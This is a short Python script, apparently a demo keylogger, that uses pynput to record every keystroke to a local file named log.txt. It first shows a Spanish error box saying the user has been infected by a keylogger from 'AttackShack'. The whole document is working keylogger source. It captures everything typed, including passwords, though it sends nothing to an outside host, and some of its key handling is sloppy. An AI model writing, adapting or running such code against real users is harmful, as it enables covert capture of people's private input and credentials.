import pynput
from tkinter import messagebox
from pynput.keyboard import Key, Listener

count = 0
keys = []


def pantallazo():
    messagebox.showerror(
        "Sistema", "Usted ha sido infectado por un Keylogger desarrollado por AttackShack")


def writefile(keys):
    with open("log.txt", "w") as f:
        for key in keys:
            k = key.replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("enter") > 0:
                f.write('\n')
            elif k.find("return") > 0:
                f.write('-bs-')
            elif k.find("tab    ") > 0:
                f.write('\t')
            elif k.find("Key") == -1:
                f.write(k)
            else:
                f.write("\n")
                f.write(k)


def onPress(key):
    global keys, count

    keys.append(f"{key}")
    count += 1
    print("{0} pressed". format(key))
    writefile(keys)


def onRelease(key):
    if key == Key.esc:
        return False


pantallazo()
with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()
